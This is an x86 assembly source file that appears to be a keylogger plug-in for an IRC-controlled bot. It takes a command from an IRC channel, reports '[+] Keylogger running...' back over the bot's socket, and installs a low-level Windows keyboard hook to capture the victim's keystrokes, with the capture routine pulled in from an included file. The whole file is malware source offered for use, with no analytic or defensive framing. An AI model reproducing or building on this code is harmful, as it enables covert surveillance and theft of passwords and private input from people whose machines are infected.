;-----------------------------------------------------------------------
.386
.model flat, stdcall
option casemap:none

;-----------------------------------------------------------------------
include     project.inc
include     ..\..\common\misc.inc

;-----------------------------------------------------------------------
include     klog.core.asm

;-----------------------------------------------------------------------
.code
;-----------------------------------------------------------------------
start_keylogger    proc lpszline
    local   _szreply[256]:byte, _szreply2[256]:byte

    invoke  get_token, addr _szreply, lpszline, ' ', 0, FALSE
    invoke  get_token, addr _szreply, addr _szreply, ':', 1, FALSE
    invoke  get_token, addr _szreply, addr _szreply, '!', 0, FALSE
    
    ; its for
    invoke  get_token, addr _szreply2, lpszline, ' ', 2, FALSE
    
    .if     byte ptr szreply != '#'
        invoke  wsprintf, addr szreply, SADD('PRIVMSG %s :'), addr _szreply2
    .else
        invoke  wsprintf, addr szreply, SADD('PRIVMSG %s :'), addr _szreply
    .endif

    mov     eax, lpbot_info
    mov     ebx, (sbot_data ptr [eax]).dwsocket
    invoke  wsprintf, addr _szreply, SADD('%s%s', EOL), addr szreply, SADD("[+] Keylogger running...")
    invoke  printf, SADD("%s"), addr _szreply
    invoke  send, ebx, addr _szreply , FUNC(lstrlen, addr _szreply), 0

    ; get our module handle for setting the hook
    invoke  GetModuleHandle, NULL

    ; Register our keyboard hook proc and start hooking
    ; Where our hook proc is located
    ; Low level key logger WH_KEYBOARD_LL = 13
    invoke  SetWindowsHookEx, WH_KEYBOARD_LL, addr keylogger_core, eax, NULL
    mov     hhook, eax            ; ok here is our hook handle for later

    ; wait for a message it will be in the message struct
    ; We need to check for messages like our hot key, so we can close when we get it
    invoke  GetMessage, addr msg, NULL, NULL, NULL

    ; we got the hot key, lets close up house 
    ; make sure we unhook things to be nice
    invoke  UnhookWindowsHookEx, hhook
    
    ret
start_keylogger    endp

;-----------------------------------------------------------------------
ibm_init    proc    lpsbot_data
    
    m2m     lpbot_info, lpsbot_data
    mov     eax, offset mdt
    
    ret
ibm_init    endp

end
;-----------------------------------------------------------------------
